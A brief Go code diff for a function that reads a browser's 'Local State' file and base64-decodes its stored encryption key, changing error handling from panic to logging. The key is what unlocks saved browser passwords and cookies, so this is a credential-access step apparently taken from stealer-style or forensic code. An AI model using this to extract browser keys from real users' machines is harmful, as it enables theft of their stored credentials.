@@ -56,7 +56,7 @@ func GetBrowserEncryptedKey(browserPath string) []byte {
 
 	file, err := os.ReadFile(path.Join(browserPath, "Local State"))
 	if err != nil {
-		panic(err)
+		log.Println(err)
 	}
 
 	var result map[string]interface{}
@@ -65,7 +65,7 @@ func GetBrowserEncryptedKey(browserPath string) []byte {
 
 	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)
 	if err != nil {
-		panic(err)
+		log.Println(err)
 	}
 	stringKey := string(decodedKey)
 
